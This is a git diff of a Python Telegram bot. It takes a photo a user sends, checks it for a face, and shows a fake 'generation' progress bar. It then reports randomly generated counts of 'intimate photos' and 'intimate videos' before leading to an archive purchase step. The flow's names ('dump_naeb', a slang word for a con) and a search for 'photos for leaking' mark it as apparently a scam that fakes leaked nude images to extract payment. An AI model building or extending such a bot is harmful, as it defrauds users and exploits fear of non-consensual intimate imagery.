@@ -3,8 +3,12 @@ from main.models import *
 from asgiref.sync import sync_to_async
 from rest_framework.authtoken.models import Token
 
-import os, django, logging, warnings, uuid, time, random, cv2
+import os, django, logging, warnings, uuid, time, random, cv2, urllib.request
 warnings.filterwarnings("ignore")
+
+from PIL import Image
+import urllib.request
+import numpy
 
 from django.core.management.base import BaseCommand
 
@@ -122,18 +126,34 @@ async def check_photo(update: Update, context: CallbackContext):
     else:
         message = update.callback_query.message
 
+    context.user_data['photo_search'] = message.photo[0].file_id
+    file_info = await context.bot.get_file(message.photo[0].file_id)
+    urllib.request.urlretrieve(file_info.file_path, "gfg.png")
+
+    pil_image = Image.open("gfg.png")
+    
+    logging.info(file_info)
+    
     face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
-    img = cv2.imread(message.photo[0].file_id)
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+
+    gray = cv2.cvtColor(numpy.array(pil_image), cv2.COLOR_BGR2GRAY)
 
     faces = face_cascade.detectMultiScale(gray, 1.3, 5)
     if len(faces) != 0:
         await context.bot.send_message(
             message.chat.id,
             '<b>Лицо обнаружено</b>',
-            parse_mode="HTML"
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+            [
+                InlineKeyboardButton(
+                    text="⏭️ Продолжить",
+                    callback_data="face_pass",
+                )
+            ],
+        ])
         )
-        return 2
+        
     else:
         await context.bot.send_message(
             message.chat.id,
@@ -142,13 +162,14 @@ async def check_photo(update: Update, context: CallbackContext):
             reply_markup=InlineKeyboardMarkup([
             [
                 InlineKeyboardButton(
-                    text="⏮️ В меню",
-                    callback_data="menu",
+                    text="⏮️ Попробовать еще раз",
+                    callback_data="face_blocking",
                 )
             ],
         ])
     )
-
+    return 2
+    
 async def search(update:Update, context: CallbackContext):
     startin_text = list("🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥")
     if update.message:
@@ -156,8 +177,6 @@ async def search(update:Update, context: CallbackContext):
     else:
         message = update.callback_query.message
     
-    logging.info(message.photo[0].file_id)
-
     msg = await context.bot.send_message(
         message.chat.id,
             f"Выполянем генерацию... 🔎\n\n✅ Фотография в разработке\n\n⏳ Готовим материал... <b>{0}%</b>\n{''.join(startin_text)}",
@@ -174,9 +193,12 @@ async def search(update:Update, context: CallbackContext):
         )
         time.sleep(.1)
 
+    logging.info(message)
+
     await context.bot.send_photo(
             chat_id=message.chat.id,
-            photo=message.photo[0].file_id,
+            photo=context.user_data.get('photo_search', 
+            'https://www.google.com/search?q=%D1%84%D0%BE%D1%82%D0%BA%D0%B8++%D0%B4%D0%BB%D1%8F+%D1%81%D0%BB%D0%B8%D0%B2%D0%B0+%D1%82%D0%B3&tbm=isch&ved=2ahUKEwjlgK2GsKqAAxVUJhAIHbBUCC8Q2-cCegQIABAA&oq=%D1%84%D0%BE%D1%82%D0%BA%D0%B8++%D0%B4%D0%BB%D1%8F+%D1%81%D0%BB%D0%B8%D0%B2%D0%B0+%D1%82%D0%B3&gs_lcp=CgNpbWcQAzoECCMQJ1CvDFivDGDBEWgAcAB4AIABVIgBpQGSAQEymAEAoAEBqgELZ3dzLXdpei1pbWfAAQE&sclient=img&ei=SwXAZKWvHtTMwPAPsKmh-AI&bih=789&biw=1440#imgrc=KG6sDTg91r5r4M'),
             caption=f"<b>Фотографии сгенерированы</b> ✅\n\n<b>Интим фото: </b>{random.randint(5, 30)} шт.\n<b>Интим видео: </b>{random.randint(1, 3)} шт.", 
             parse_mode="HTML", 
             reply_markup=InlineKeyboardMarkup([
@@ -293,9 +315,9 @@ def main() -> None:
         entry_points=[CallbackQueryHandler(ask_for_link, "dump_naeb",)],
         states={
             0:[CallbackQueryHandler(content, "search",)],
-            1:[MessageHandler(filters.PHOTO, check_photo), 
+            1:[MessageHandler(filters.PHOTO, check_photo)],
+            2:[CallbackQueryHandler(search, "face_pass"),
                CallbackQueryHandler(content, 'face_blocking')],
-            2:[CallbackQueryHandler(search, "face_pass")],
             3:[CallbackQueryHandler(confirm_paying, "buy_archive",)],
         },
         fallbacks=[CallbackQueryHandler(start, "menu",)]
